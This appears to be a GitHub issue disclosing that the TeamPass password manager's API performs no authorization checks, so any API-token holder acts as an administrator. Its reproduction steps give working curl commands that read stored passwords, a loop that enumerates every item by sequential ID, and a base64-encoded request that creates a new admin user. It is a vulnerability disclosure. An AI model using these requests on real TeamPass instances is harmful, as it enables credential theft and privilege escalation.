## Description

![@bstapes](https://avatars.githubusercontent.com/u/20693610?v=4&size=48)[bstapes](https://github.com/bstapes)opened [on Apr 2, 2020](https://github.com/nilsteampassnet/TeamPass/issues/2765#issue-592759568)

TeamPass provides several APIs that can be used for programmatic access. None of these API functions perform authorization checks which means that any client with a valid API token is effectively an administrator. Any client with a valid API token can:

* Read all passwords stored by Teampass
* Create users. This includes non-administrative users creating administrative users
* Update any stored item
* Update any user
* Delete any folder or item

It’s important to note that API access is disabled by default.

**Steps to reproduce**

1. Turn on API access
2. As a non-admin user, generate an API key
3. Send authenticated HTTP requests

Retrieve passwords:

`curl http://<your Teampass instance>/teampass/api/index.php/read/items/1?apikey=<your key>`

Note that the ID for each “item” starts at 1 and increments by 1 for each new item. This makes it easy to retrieve all items stored by Teampass

```
for i in {1..5}; do
  curl http://localhost/teampass/api/index.php/read/items/$i?apikey=xyz
  echo "";
done

```

Add a new admin user

```
# <LOGIN>;<NAME>;<LASTNAME>;<PASSWORD>;<EMAIL>;<ADMINISTRATEDBY>;<READ_ONLY>;<ROLE1,ROLE2,...>;<IS_ADMIN>;<ISMANAGER>;<PERSONAL_FOLDER>
payload="newadmin;foo;bar;testpassword;a@a.com;Administrator;0;;1;;"
b64=$(echo $payload | base64)
curl http://localhost/teampass/api/index.php/add/user/$b64?apikey=xyz

```
